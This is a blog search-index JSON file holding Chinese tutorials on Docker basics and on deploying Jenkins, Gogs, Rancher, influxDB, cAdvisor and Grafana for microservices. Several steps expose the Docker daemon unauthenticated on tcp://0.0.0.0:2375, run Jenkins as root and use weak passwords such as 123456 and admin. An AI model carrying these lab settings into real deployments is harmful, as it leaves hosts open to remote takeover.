{"meta":{"title":"山城冰荔枝","subtitle":"","description":"","author":"山城冰荔枝","url":"http://blog.ioimp.top","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2023-08-03T12:38:08.372Z","updated":"2023-08-03T12:38:08.372Z","comments":false,"path":"/404.html","permalink":"http://blog.ioimp.top/404.html","excerpt":"","text":""},{"title":"关于","date":"2023-08-03T12:38:08.375Z","updated":"2023-08-03T12:38:08.375Z","comments":false,"path":"about/index.html","permalink":"http://blog.ioimp.top/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"书单","date":"2023-08-03T12:38:08.376Z","updated":"2023-08-03T12:38:08.376Z","comments":false,"path":"books/index.html","permalink":"http://blog.ioimp.top/books/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-08-03T14:00:34.003Z","updated":"2023-08-03T14:00:34.003Z","comments":true,"path":"categories/index.html","permalink":"http://blog.ioimp.top/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-08-03T12:38:08.380Z","updated":"2023-08-03T12:38:08.380Z","comments":false,"path":"tags/index.html","permalink":"http://blog.ioimp.top/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-08-03T12:38:08.378Z","updated":"2023-08-03T12:38:08.378Z","comments":true,"path":"links/index.html","permalink":"http://blog.ioimp.top/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-08-03T12:38:08.379Z","updated":"2023-08-03T12:38:08.379Z","comments":false,"path":"repository/index.html","permalink":"http://blog.ioimp.top/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"持续集成与容器管理","slug":"持续集成与容器管理","date":"2023-11-16T08:44:40.000Z","updated":"2023-11-16T08:54:36.627Z","comments":true,"path":"2023/11/16/持续集成与容器管理/","link":"","permalink":"http://blog.ioimp.top/2023/11/16/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E4%B8%8E%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86/","excerpt":"","text":"持续集成与容器管理学习目标： 掌握DockerMaven插件的使用 掌握持续集成工具Jenkins的安装与使用 掌握容器管理工具Rancher的安装与使用 掌握时间序列数据库influxDB的安装与使用 掌握容器监控工具cAdvisor的安装与使用 掌握图表工具Grafana的使用 1 DockerMaven插件微服务部署有两种方法： （1）手动部署：首先基于源码打包生成jar包（或war包）,将jar包（或war包）上传至虚拟机并拷贝至JDK容器。 （2）通过Maven插件自动部署。 对于数量众多的微服务，手动部署无疑是非常麻烦的做法，并且容易出错。所以我们这里学习如何自动部署，这也是企业实际开发中经常使用的方法。 Maven插件自动部署步骤： （1）修改宿主机的docker配置，让其可以远程访问 1vi /lib/systemd/system/docker.service 其中ExecStart&#x3D;后添加配置-H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock 修改后如下： （2）刷新配置，重启服务 123systemctl daemon-reloadsystemctl restart dockerdocker start registry （3）在工程pom.xml 增加配置 12345678910111213141516171819202122232425262728 &lt;build&gt; &lt;finalName&gt;app&lt;/finalName&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;!-- docker的maven插件，官网：https://github.com/spotify/docker-maven-plugin --&gt; &lt;plugin&gt; &lt;groupId&gt;com.spotify&lt;/groupId&gt; &lt;artifactId&gt;docker-maven-plugin&lt;/artifactId&gt; &lt;version&gt;0.4.13&lt;/version&gt; &lt;configuration&gt; &lt;imageName&gt;192.168.73.135:5000/$&#123;project.artifactId&#125;:$&#123;project.version&#125;&lt;/imageName&gt; &lt;baseImage&gt;jdk1.8&lt;/baseImage&gt; &lt;entryPoint&gt;[&quot;java&quot;, &quot;-jar&quot;, &quot;/$&#123;project.build.finalName&#125;.jar&quot;]&lt;/entryPoint&gt; &lt;resources&gt; &lt;resource&gt; &lt;targetPath&gt;/&lt;/targetPath&gt; &lt;directory&gt;$&#123;project.build.directory&#125;&lt;/directory&gt; &lt;include&gt;$&#123;project.build.finalName&#125;.jar&lt;/include&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;dockerHost&gt;http://192.168.73.135:2375&lt;/dockerHost&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 以上配置会自动生成Dockerfile 123FROM jdk1.8ADD app.jar /ENTRYPOINT [&quot;java&quot;,&quot;-jar&quot;,&quot;/app.jar&quot;] （5）在windows的命令提示符下，进入工程tensquare_parent所在的目录 1mvn install 进入tensquare_base 所在的目录，输入以下命令，进行打包和上传镜像 1mvn docker:build -DpushImage 执行后，会有如下输出，代码正在上传 （6）进入宿主机 , 查看镜像 1docker images 1234REPOSITORY TAG IMAGE ID CREATED SIZE192.168.184.135:5000/tensquare_base 1.0-SNAPSHOT 83efa6b4478c 10 minutes ago 687.9 MB192.168.184.135:5000/jdk1.8 latest 507438a0158f 6 hours ago 584 MBjdk1.8 latest 507438a0158f 6 hours ago 584 MB 输出如上内容，表示微服务已经做成镜像 浏览器访问 http://192.168.73.135:5000/v2/_catalog ，输出 1&#123;&quot;repositories&quot;:[&quot;tensquare_base&quot;]&#125; 浏览器访问 http://192.168.73.135:5000/v2/_catalog ，输出 1&#123;&quot;repositories&quot;:[&quot;tensquare_base&quot;]&#125; （7） 启动容器： 1docker run -di --name=base -p 9001:9001 192.168.73.135:5000/tensquare_base:1.0-SNAPSHOT 2 持续集成工具-Jenkins2.1 什么是持续集成​ 持续集成 Continuous integration ，简称CI ​ 随着软件开发复杂度的不断提高，团队开发成员间如何更好地协同工作以确保软件开发的质量已经慢慢成为开发过程中不可回避的问题。尤其是近些年来，敏捷（Agile） 在软件工程领域越来越红火，如何能再不断变化的需求中快速适应和保证软件的质量也显得尤其的重要。 ​ 持续集成正是针对这一类问题的一种软件开发实践。它倡导团队开发成员必须经常集成他们的工作，甚至每天都可能发生多次集成。而每次的集成都是通过自动化的构建来验证，包括自动编译、发布和测试，从而尽快地发现集成错误，让团队能够更快的开发内聚的软件。 持续集成具有的特点： 它是一个自动化的周期性的集成测试过程，从检出代码、编译构建、运行测试、结果记录、测试统计等都是自动完成的，无需人工干预； 需要有专门的集成服务器来执行集成构建； 需要有代码托管工具支持，我们下一小节将介绍Git以及可视化界面Gogs的使用 持续集成的作用： 保证团队开发人员提交代码的质量，减轻了软件发布时的压力； 持续集成中的任何一个环节都是自动完成的，无需太多的人工干预，有利于减少重复过程以节省时间、费用和工作量； 2.2 Jenkins简介​ Jenkins，原名Hudson，2011年改为现在的名字，它 是一个开源的实现持续集成的软件工具。官方网站：http://jenkins-ci.org/。 ​ Jenkins 能实施监控集成中存在的错误，提供详细的日志文件和提醒功能，还能用图表的形式形象地展示项目构建的趋势和稳定性。 ​ 特点： 易安装：仅仅一个 java -jar jenkins.war，从官网下载该文件后，直接运行，无需额外的安装，更无需安装数据库； 易配置：提供友好的GUI配置界面； 变更支持：Jenkins能从代码仓库（Subversion&#x2F;CVS）中获取并产生代码更新列表并输出到编译输出信息中； 支持永久链接：用户是通过web来访问Jenkins的，而这些web页面的链接地址都是永久链接地址，因此，你可以在各种文档中直接使用该链接； 集成E-Mail&#x2F;RSS&#x2F;IM：当完成一次集成时，可通过这些工具实时告诉你集成结果（据我所知，构建一次集成需要花费一定时间，有了这个功能，你就可以在等待结果过程中，干别的事情）； JUnit&#x2F;TestNG测试报告：也就是用以图表等形式提供详细的测试报表功能； 支持分布式构建：Jenkins可以把集成构建等工作分发到多台计算机中完成； 文件指纹信息：Jenkins会保存哪次集成构建产生了哪些jars文件，哪一次集成构建使用了哪个版本的jars文件等构建记录； 支持第三方插件：使得 Jenkins 变得越来越强大 2.3 Jenkins安装2.3.1 JDK安装（1）将jdk-8u171-linux-x64.rpm上传至服务器（虚拟机） （2）执行安装命令 1rpm -ivh jdk-8u171-linux-x64.rpm RPM方式安装JDK，其根目录为：&#x2F;usr&#x2F;java&#x2F;jdk1.8.0_171-amd64 2.3.2 Jenkins安装与启动（1）下载jenkins 1wget https://pkg.jenkins.io/redhat/jenkins-2.83-1.1.noarch.rpm 或将jenkins-2.83-1.1.noarch.rpm上传至服务器 （2）安装jenkins 1rpm -ivh jenkins-2.83-1.1.noarch.rpm （3）配置jenkins 1vi /etc/sysconfig/jenkins 修改用户和端口 12JENKINS_USER=&quot;root&quot;JENKINS_PORT=&quot;8888&quot; （4）启动服务 1systemctl start jenkins （5）访问链接 http://192.168.184.135:8888 从&#x2F;var&#x2F;lib&#x2F;jenkins&#x2F;secrets&#x2F;initialAdminPassword中获取初始密码串 （6）安装插件 （7）新建用户 完成安装进入主界面 2.4 Jenkins插件安装我们以安装maven插件为例，演示插件的安装 （1）点击左侧的“系统管理”菜单 ,然后点击 （2）选择“可选插件”选项卡，搜索maven，在列表中选择Maven Integration ，点击“直接安装”按钮 看到如下图时，表示已经完成 2.5 全局工具配置2.5.1 安装Maven与本地仓库（1）将Maven压缩包上传至服务器（虚拟机） （2）解压 1tar zxvf apache-maven-3.5.4-bin.tar.gz （3）移动目录 1mv apache-maven-3.5.4 /usr/local/maven （4）编辑setting.xml配置文件vi /usr/local/maven/conf/settings.xml ，配置本地仓库目录,内容如下 1&lt;localRepository&gt;/usr/local/repository&lt;/localRepository&gt; （5）将开发环境的本地仓库上传至服务器（虚拟机）并移动到&#x2F;usr&#x2F;local&#x2F;repository 。 1mv reponsitory_boot /usr/local/repository 执行此步是为了以后在打包的时候不必重新下载，缩短打包的时间。 2.5.2 全局工具配置选择系统管理，全局工具配置 （1）JDK配置 设置javahome为 &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_171-amd64 （2）Git配置 （本地已经安装了Git软件） （3）Maven配置 2.6 代码上传至Git服务器2.6.1 Gogs搭建与配置Gogs 是一款极易搭建的自助 Git 服务。 Gogs 的目标是打造一个最简单、最快速和最轻松的方式搭建自助 Git 服务。使用 Go 语言开发使得 Gogs 能够通过独立的二进制分发，并且支持 Go 语言支持的 所有平台，包括 Linux、Mac OS X、Windows 以及 ARM 平台。 地址：https://gitee.com/Unknown/gogs （1）下载镜像 1docker pull gogs/gogs （2）创建容器 1docker run -di --name=gogs -p 10022:22 -p 3000:3000 -v /var/gogsdata:/data gogs/gogs （3）假设我的centos虚拟机IP为192.168.73.135 在地址栏输入http://192.168.73.135:3000 会进入首次运行安装程序页面，我们可以选择一种数据库作为gogs数据的存储，最简单的是选择SQLite3。如果对于规模较大的公司，可以选择MySQL 点击“立即安装” 这里的域名要设置为centos的IP地址,安装后显示主界面 （4）注册 （5）登录 （6）创建仓库 2.6.2 提交代码步骤： （1）在本地安装git(Windows版本) （2）在IDEA中选择菜单 : File – settings , 在窗口中选择Version Control – Git （3）选择菜单VCS –&gt; Enable Version Control Integration… 选择Git （4）设置远程地址: 右键点击工程选择菜单 Git –&gt; Repository –&gt;Remotes… （5）右键点击工程选择菜单 Git –&gt; Add （6）右键点击工程选择菜单 Git –&gt; Commit Directory… （7）右键点击工程选择菜单 Git –&gt; Repository –&gt; Push … 2.7 任务的创建与执行（1）回到首页，点击新建按钮 .如下图，输入名称，选择创建一个Maven项目，点击OK （2）源码管理，选择Git （3）Build 命令: 1clean package docker:build -DpushImage 用于清除、打包，构建docker镜像 最后点击“保存”按钮 （4）执行任务 3 容器管理工具Rancher3.1 什么是Rancher​ Rancher是一个开源的企业级全栈化容器部署及管理平台。Rancher为容器提供一揽子基础架构服务：CNI兼容的网络服务、存储服务、主机管理、负载均衡、防护墙……Rancher让上述服务跨越公有云、私有云、虚拟机、物理机环境运行，真正实现一键式应用部署和管理。 ​ https://www.cnrancher.com/ 3.2 Rancher安装（1）下载Rancher 镜像 1docker pull rancher/server （2）创建Rancher容器 1docker run -di --name=rancher -p 9090:8080 rancher/server （3）在浏览器输入地址： http://192.168.73.135:9090 即可看到高端大气的欢迎页 点击Got It 进入主界面 （4）切换至中文界面 点击右下角的English 在弹出菜单中选择中文 切换后我们就可以看到亲切的中文界面啦~ 3.3 Rancher初始化3.3.1 添加环境Rancher 支持将资源分组归属到多个环境。 每个环境具有自己独立的基础架构资源及服务，并由一个或多个用户、团队或组织所管理。 例如，您可以创建独立的“开发”、“测试”及“生产”环境以确保环境之间的安全隔离，将“开发”环境的访问权限赋予全部人员，但限制“生产”环境的访问权限给一个小的团队。 （1）选择“Default –&gt;环境管理” 菜单 （2）填写名称，点击“创建”按钮 （3）按照上述步骤，添加十次方测试环境和生产环境 （4）你可以通过点击logo右侧的菜单在各种环境下切换 3.3.2 添加主机（1）选择基础架构–&gt;主机 菜单，点击添加主机 （2）拷贝脚本 （3）在服务器（虚拟机）上运行脚本 （4）点击关闭按钮后，会看到界面中显示此主机。我们可以很方便地管理主机的每个容器的开启和关闭 3.3.3 添加应用点击应用–&gt;全部(或用户) ，点击“添加应用”按钮 填写名称和描述 点击“创建”按钮，列表中增加了新增的应用 3.4 应用部署3.4.1 MySQL部署镜像：centos&#x2F;mysql-57-centos7 增加数据库服务 注意：添加环境变量 MYSQL_ROOT_PASSWORD&#x3D;123456 点击创建按钮，完成创建 上述操作相当于以下docker命令 1docker run -di --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 centos/mysql-57-centos7 完成后服务列表中存在并且状态为激活 使用SQLyog测试链接，执行建表语句 3.4.2 RabbitMQ部署镜像：rabbitmq:management 端口映射5671 5672 4369 15671 15672 25672 浏览器访问 http://192.168.184.136:15672/ 3.4.3 Redis部署进入应用，点击添加服务，名称redis ，镜像redis ，端口映射6379 创建后使用客户端测试链接 1redis-cli -h 192.168.184.144 测试成功 3.4.4 微服务部署（1）搭建私有仓库 启动私有仓库容器 1docker run -di --name=registry -p 5000:5000 registry 打开浏览器 输入地址http://192.168.184.144:5000/v2/_catalog看到`{&quot;repositories&quot;:[]}` 表示私有仓库搭建成功并且内容为空 修改daemon.json 1vi /etc/docker/daemon.json 添加以下内容，保存退出。 1&#123;&quot;insecure-registries&quot;:[&quot;192.168.184.144:5000&quot;]&#125; （2）修改docker配置，允许远程访问 1vi /lib/systemd/system/docker.service 其中ExecStart&#x3D;后添加配置-H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock 修改后刷新配置，冲洗服务 123systemctl daemon-reloadsystemctl restart dockerdocker start registry （3）修改微服务工程，添加DockerMaven插件 （4）连接mysql数据库，执行建库脚本 （5）添加服务base-service 镜像192.168.184.144:5000&#x2F;tensquare_base:1.0-SNAPSHOT 端口映射9001 （6）测试微服务 浏览器打开网址 http://192.168.184.144:9001/label 看是否可以看到标签列表 3.6 扩容与缩容3.6.1 扩容（1）在Rancher将创建的base-service（基础信息微服务）删除 （2）重新创建base-service ，不设置端口映射 （3）在选择菜单API –&gt;WebHooks ，点击“添加接收器”按钮 （4）填写名称等信息，选择要扩容的服务，点击创建按钮 （5）接收器列表中新增了一条记录 ，点击触发地址将地址复制到剪切板 （6）使用postman测试： 测试后，发现容器由原来的1个变为了3个 3.6.2 缩容刚才我们实现了扩容，那么如何减少容器数量呢？我们来试试如何缩容 （1）添加接收器 ,选择缩容，步长为1表示每次递减1个 ，点击创建按钮 （2）创建成功后，复制触发地址 （3）使用postman测试 4 influxDB4.1 什么是influxDB​ influxDB是一个分布式时间序列数据库。cAdvisor仅仅显示实时信息，但是不存储监视数据。因此，我们需要提供时序数据库用于存储cAdvisor组件所提供的监控信息，以便显示除实时信息之外的时序数据。\u000f 4.2 influxDB安装（1）下载镜像 1docker pull tutum/influxdb （2）创建容器 1234567docker run -di \\ -p 8083:8083 \\ -p 8086:8086 \\ --expose 8090 \\ --expose 8099 \\ --name influxsrv \\ tutum/influxdb 端口概述： 8083端口:web访问端口 8086:数据写入端口 打开浏览器 http://192.168.184.144:8083/ 4.3 influxDB常用操作4.3.1 创建数据库1CREATE DATABASE &quot;cadvisor&quot; 回车创建数据库 1SHOW DATABASES 查看数据库 4.3.2 创建用户并授权创建用户 1CREATE USER &quot;cadvisor&quot; WITH PASSWORD &#x27;cadvisor&#x27; WITH ALL PRIVILEGES 查看用户 1SHOW USRES 用户授权 123grant all privileges on cadvisor to cadvisorgrant WRITE on cadvisor to cadvisorgrant READ on cadvisor to cadvisor 4.3.3 查看采集的数据切换到cadvisor数据库，使用以下命令查看采集的数据 1SHOW MEASUREMENTS 现在我们还没有数据，如果想采集系统的数据，我们需要使用Cadvisor软件来实现 5 cAdvisor5.1 什么是cAdvisor​ Google开源的用于监控基础设施应用的工具，它是一个强大的监控工具，不需要任何配置就可以通过运行在Docker主机上的容器来监控Docker容器，而且可以监控Docker主机。更多详细操作和配置选项可以查看Github上的cAdvisor项目文档。 5.2 cAdvisor安装（1）下载镜像 1docker pull google/cadvisor （2）创建容器 1docker run --volume=/:/rootfs:ro --volume=/var/run:/var/run:rw --volume=/sys:/sys:ro --volume=/var/lib/docker/:/var/lib/docker:ro --publish=8080:8080 --detach=true --link influxsrv:influxsrv --name=cadvisor google/cadvisor -storage_driver=influxdb -storage_driver_db=cadvisor -storage_driver_host=influxsrv:8086 WEB前端访问地址 http://192.168.184.144:8080/containers/ 性能指标含义参照如下地址 https://blog.csdn.net/ZHANG_H_A&#x2F;article&#x2F;details&#x2F;53097084 再次查看influxDB，发现已经有很多数据被采集进去了。 6 Grafana6.1 什么是Grafana​ Grafana是一个可视化面板（Dashboard），有着非常漂亮的图表和布局展示，功能齐全的度量仪表盘和图形编辑器。支持Graphite、zabbix、InfluxDB、Prometheus和OpenTSDB作为数据源。Grafana主要特性：灵活丰富的图形化选项；可以混合多种风格；支持白天和夜间模式；多个数据源。 6.2 Grafana安装（1）下载镜像 1docker pull grafana/grafana （2）创建容器 1docker run -d -p 3001:3000 -e INFLUXDB_HOST=influxsrv -e INFLUXDB_PORT=8086 -e INFLUXDB_NAME=cadvisor -e INFLUXDB_USER=cadvisor -e INFLUXDB_PASS=cadvisor --link influxsrv:influxsrv --name grafana grafana/grafana （3）访问 1http://192.168.184.144:3001 用户名密码均为admin （4）登录后提示你修改密码 （5）之后进入主页面 6.3 Grafana的使用6.3.1 添加数据源（1）点击设置，DataSource （2）点击添加data source （3）为数据源起个名称，指定类型、地址、以及连接的数据库名、用户名和密码 点击保存。数据源建立成功 6.3.2 添加仪表盘（1）选择Dashboards –Manager （2）点击“添加”按钮 （3）点击Graph 图标 （4）出现下面图表的界面 ，点击Panel Title 选择Edit (编辑) （5）定义标题等基础信息 （6）设置查询的信息为内存，指定容器名称 （7）指定y轴的单位 为M （8）保存 填写名称 6.4.3 预警通知设置（1）选择菜单 alerting–&gt; Notification channels （2）点击Add channel 按钮 （3）填写名称，选择类型为webhook ,填写钩子地址 这个钩子地址是之前对base微服务扩容的地址 （4）点击SendTest 测试 观察基础微服务是否增加容器 （5）点击save保存 （6）按照同样的方法添加缩容地址 6.4.4 仪表盘预警设置（1）再次打开刚刚编辑的仪表盘 （2）点击 Create Alert 设置预警线 （3）选择通知 保存更改","categories":[{"name":"Java学习","slug":"Java学习","permalink":"http://blog.ioimp.top/categories/Java%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Jenkins","slug":"Jenkins","permalink":"http://blog.ioimp.top/tags/Jenkins/"},{"name":"Rancher","slug":"Rancher","permalink":"http://blog.ioimp.top/tags/Rancher/"},{"name":"influxDB","slug":"influxDB","permalink":"http://blog.ioimp.top/tags/influxDB/"},{"name":"cAdvisor","slug":"cAdvisor","permalink":"http://blog.ioimp.top/tags/cAdvisor/"},{"name":"Grafana","slug":"Grafana","permalink":"http://blog.ioimp.top/tags/Grafana/"}]},{"title":"ES6模块化","slug":"ES6模块化","date":"2023-11-16T01:51:36.000Z","updated":"2023-11-16T08:30:58.877Z","comments":true,"path":"2023/11/16/ES6模块化/","link":"","permalink":"http://blog.ioimp.top/2023/11/16/ES6%E6%A8%A1%E5%9D%97%E5%8C%96/","excerpt":"","text":"","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}]},{"title":"Docker基础学习","slug":"docker","date":"2023-11-13T01:22:04.000Z","updated":"2023-11-16T08:44:52.317Z","comments":true,"path":"2023/11/13/docker/","link":"","permalink":"http://blog.ioimp.top/2023/11/13/docker/","excerpt":"","text":"Docker学习目标： 掌握Docker基础知识，能够理解Docker镜像与容器的概念 完成Docker安装与启动 掌握Docker镜像与容器相关命令 掌握Tomcat Nginx 等软件的常用应用的安装 掌握docker迁移与备份相关命令 能够运用Dockerfile编写创建容器的脚本 能够搭建与使用docker私有仓库 1 Docker简介1.1 什么是虚拟化​ 在计算机中，虚拟化（英语：Virtualization）是一种资源管理技术，是将计算机的各种实体资源，如服务器、网络、内存及存储等，予以抽象、转换后呈现出来，打破实体结构间的不可切割的障碍，使用户可以比原本的组态更好的方式来应用这些资源。这些资源的新虚拟部份是不受现有资源的架设方式，地域或物理组态所限制。一般所指的虚拟化资源包括计算能力和资料存储。 ​ 在实际的生产环境中，虚拟化技术主要用来解决高性能的物理硬件产能过剩和老的旧的硬件产能过低的重组重用，透明化底层物理硬件，从而最大化的利用物理硬件 对资源充分利用 ​ 虚拟化技术种类很多，例如：软件虚拟化、硬件虚拟化、内存虚拟化、网络虚拟化(vip)、桌面虚拟化、服务虚拟化、虚拟机等等。 1.2 什么是Docker​ Docker 是一个开源项目，诞生于 2013 年初，最初是 dotCloud 公司内部的一个业余项目。它基于 Google 公司推出的 Go 语言实现。 项目后来加入了 Linux 基金会，遵从了 Apache 2.0 协议，项目代码在 GitHub 上进行维护。 ​ ​ Docker 自开源后受到广泛的关注和讨论，以至于 dotCloud 公司后来都改名为 Docker Inc。Redhat 已经在其 RHEL6.5 中集中支持 Docker；Google 也在其 PaaS 产品中广泛应用。 ​ Docker 项目的目标是实现轻量级的操作系统虚拟化解决方案。 Docker 的基础是 Linux 容器（LXC）等技术。 ​ 在 LXC 的基础上 Docker 进行了进一步的封装，让用户不需要去关心容器的管理，使得操作更为简便。用户操作 Docker 的容器就像操作一个快速轻量级的虚拟机一样简单。 为什么选择Docker? （1）上手快。 ​ 用户只需要几分钟，就可以把自己的程序“Docker化”。Docker依赖于“写时复制”（copy-on-write）模型，使修改应用程序也非常迅速，可以说达到“随心所致，代码即改”的境界。 随后，就可以创建容器来运行应用程序了。大多数Docker容器只需要不到1秒中即可启动。由于去除了管理程序的开销，Docker容器拥有很高的性能，同时同一台宿主机中也可以运行更多的容器，使用户尽可能的充分利用系统资源。 （2）职责的逻辑分类 ​ 使用Docker，开发人员只需要关心容器中运行的应用程序，而运维人员只需要关心如何管理容器。Docker设计的目的就是要加强开发人员写代码的开发环境与应用程序要部署的生产环境一致性。从而降低那种“开发时一切正常，肯定是运维的问题（测试环境都是正常的，上线后出了问题就归结为肯定是运维的问题）” （3）快速高效的开发生命周期 ​ Docker的目标之一就是缩短代码从开发、测试到部署、上线运行的周期，让你的应用程序具备可移植性，易于构建，并易于协作。（通俗一点说，Docker就像一个盒子，里面可以装很多物件，如果需要这些物件的可以直接将该大盒子拿走，而不需要从该盒子中一件件的取。） （4）鼓励使用面向服务的架构 ​ Docker还鼓励面向服务的体系结构和微服务架构。Docker推荐单个容器只运行一个应用程序或进程，这样就形成了一个分布式的应用程序模型，在这种模型下，应用程序或者服务都可以表示为一系列内部互联的容器，从而使分布式部署应用程序，扩展或调试应用程序都变得非常简单，同时也提高了程序的内省性。（当然，可以在一个容器中运行多个应用程序） 1.3 容器与虚拟机比较​ 下面的图片比较了 Docker 和传统虚拟化方式的不同之处，可见容器是在操作系统层面上实现虚拟化，直接复用本地主机的操作系统，而传统方式则是在硬件层面实现。 与传统的虚拟机相比，Docker优势体现为启动速度快、占用体积小。 1.4 Docker 组件1.4.1 Docker服务器与客户端​ Docker是一个客户端-服务器（C&#x2F;S）架构程序。Docker客户端只需要向Docker服务器或者守护进程发出请求，服务器或者守护进程将完成所有工作并返回结果。Docker提供了一个命令行工具Docker以及一整套RESTful API。你可以在同一台宿主机上运行Docker守护进程和客户端，也可以从本地的Docker客户端连接到运行在另一台宿主机上的远程Docker守护进程。 1.4.2 Docker镜像与容器​ 镜像是构建Docker的基石。用户基于镜像来运行自己的容器。镜像也是Docker生命周期中的“构建”部分。镜像是基于联合文件系统的一种层式结构，由一系列指令一步一步构建出来。例如： 添加一个文件； 执行一个命令； 打开一个窗口。 也可以将镜像当作容器的“源代码”。镜像体积很小，非常“便携”，易于分享、存储和更新。 ​ Docker可以帮助你构建和部署容器，你只需要把自己的应用程序或者服务打包放进容器即可。容器是基于镜像启动起来的，容器中可以运行一个或多个进程。我们可以认为，镜像是Docker生命周期中的构建或者打包阶段，而容器则是启动或者执行阶段。 容器基于镜像启动，一旦容器启动完成后，我们就可以登录到容器中安装自己需要的软件或者服务。 所以Docker容器就是： ​ 一个镜像格式； ​ 一些列标准操作； ​ 一个执行环境。 ​ Docker借鉴了标准集装箱的概念。标准集装箱将货物运往世界各地，Docker将这个模型运用到自己的设计中，唯一不同的是：集装箱运输货物，而Docker运输软件。 和集装箱一样，Docker在执行上述操作时，并不关心容器中到底装了什么，它不管是web服务器，还是数据库，或者是应用程序服务器什么的。所有的容器都按照相同的方式将内容“装载”进去。 Docker也不关心你要把容器运到何方：我们可以在自己的笔记本中构建容器，上传到Registry，然后下载到一个物理的或者虚拟的服务器来测试，在把容器部署到具体的主机中。像标准集装箱一样，Docker容器方便替换，可以叠加，易于分发，并且尽量通用。 1.4.3 Registry（注册中心）​ Docker用Registry来保存用户构建的镜像。Registry分为公共和私有两种。Docker公司运营公共的Registry叫做Docker Hub。用户可以在Docker Hub注册账号，分享并保存自己的镜像（说明：在Docker Hub下载镜像巨慢，可以自己构建私有的Registry）。 ​ https://hub.docker.com/ 2 Docker安装与启动2.1 安装Docker​ Docker官方建议在Ubuntu中安装，因为Docker是基于Ubuntu发布的，而且一般Docker出现的问题Ubuntu是最先更新或者打补丁的。在很多版本的CentOS中是不支持更新最新的一些补丁包的。 ​ 由于我们学习的环境都使用的是CentOS，因此这里我们将Docker安装到CentOS上。注意：这里建议安装在CentOS7.x以上的版本，在CentOS6.x的版本中，安装前需要安装其他很多的环境而且Docker很多补丁不支持更新。 ​ 请直接挂载课程配套的Centos7.x镜像 （1）yum 包更新到最新 1sudo yum update （2）安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的 1sudo yum install -y yum-utils device-mapper-persistent-data lvm2 （3）设置yum源为阿里云 1sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo （4）安装docker 1sudo yum install docker-ce （5）安装后查看docker版本 1docker -v 2.2 设置ustc的镜像ustc是老牌的linux镜像服务提供者了，还在遥远的ubuntu 5.04版本的时候就在用。ustc的docker镜像加速器速度很快。ustc docker mirror的优势之一就是不需要注册，是真正的公共服务。 https://lug.ustc.edu.cn/wiki/mirrors/help/docker 编辑该文件： 1vi /etc/docker/daemon.json 在该文件中输入如下内容： 123&#123;&quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn&quot;]&#125; 2.3 Docker的启动与停止systemctl命令是系统服务管理器指令 启动docker： 1systemctl start docker 停止docker： 1systemctl stop docker 重启docker： 1systemctl restart docker 查看docker状态： 1systemctl status docker 开机启动： 1systemctl enable docker 查看docker概要信息 1docker info 查看docker帮助文档 1docker --help 3 常用命令3.1 镜像相关命令3.1.1 查看镜像1docker images REPOSITORY：镜像名称 TAG：镜像标签 IMAGE ID：镜像ID CREATED：镜像的创建日期（不是获取该镜像的日期） SIZE：镜像大小 这些镜像都是存储在Docker宿主机的&#x2F;var&#x2F;lib&#x2F;docker目录下 3.1.2 搜索镜像如果你需要从网络中查找需要的镜像，可以通过以下命令搜索 1docker search 镜像名称 NAME：仓库名称 DESCRIPTION：镜像描述 STARS：用户评价，反应一个镜像的受欢迎程度 OFFICIAL：是否官方 AUTOMATED：自动构建，表示该镜像由Docker Hub自动构建流程创建的 3.1.3 拉取镜像拉取镜像就是从中央仓库中下载镜像到本地 1docker pull 镜像名称 例如，我要下载centos7镜像 1docker pull centos:7 3.1.4 删除镜像按镜像ID删除镜像 1docker rmi 镜像ID 删除所有镜像 1docker rmi `docker images -q` 3.2 容器相关命令3.2.1 查看容器查看正在运行的容器 1docker ps 查看所有容器 1docker ps –a 查看最后一次运行的容器 1docker ps –l 查看停止的容器 1docker ps -f status=exited 3.2.2 创建与启动容器创建容器常用的参数说明： 创建容器命令：docker run -i：表示运行容器 -t：表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即分配一个伪终端。 –name :为创建的容器命名。 -v：表示目录映射关系（前者是宿主机目录，后者是映射到宿主机上的目录），可以使用多个－v做多个目录或文件映射。注意：最好做目录映射，在宿主机上做修改，然后共享到容器上。 -d：在run后面加上-d参数,则会创建一个守护式容器在后台运行（这样创建容器后不会自动登录容器，如果只加-i -t两个参数，创建后就会自动进去容器）。 -p：表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p做多个端口映射 （1）交互式方式创建容器 1docker run -it --name=容器名称 镜像名称:标签 /bin/bash 这时我们通过ps命令查看，发现可以看到启动的容器，状态为启动状态 退出当前容器 1exit （2）守护式方式创建容器： 1docker run -di --name=容器名称 镜像名称:标签 登录守护式容器方式： 1docker exec -it 容器名称 (或者容器ID) /bin/bash 3.2.3 停止与启动容器停止容器： 1docker stop 容器名称（或者容器ID） 启动容器： 1docker start 容器名称（或者容器ID） 3.2.4 文件拷贝如果我们需要将文件拷贝到容器内可以使用cp命令 1docker cp 需要拷贝的文件或目录 